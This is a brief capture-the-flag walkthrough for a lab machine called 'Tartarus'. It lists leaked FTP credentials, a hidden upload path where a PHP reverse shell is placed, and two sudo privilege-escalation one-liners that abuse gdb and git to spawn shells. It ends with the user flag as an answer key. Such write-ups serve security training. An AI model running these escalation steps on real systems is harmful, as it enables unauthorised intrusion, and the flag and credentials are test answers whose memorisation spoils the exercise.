# Tartarus

> John Hammond | August 16th, 2020

---------------------------

# [Task 1] Tartarus

> User and Root Flag

Find hidden files in ftp directories that include web url and logins:

```
/sUp3r-s3cr3t


enox:P@ssword1234
```

Upload classic revshell

Find in `/sUp3r-s3cr3t/images/uploads/revshell.php`

On the box, `sudo -l` showcases first privesc

```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

Second pivesc from `sudo -l`

```
sudo -u d4rckh /usr/bin/git help config
```

## 1. User Flag


```
0f7dbb2243e692e3ad222bc4eff8521f
```


## 2. Root Flag


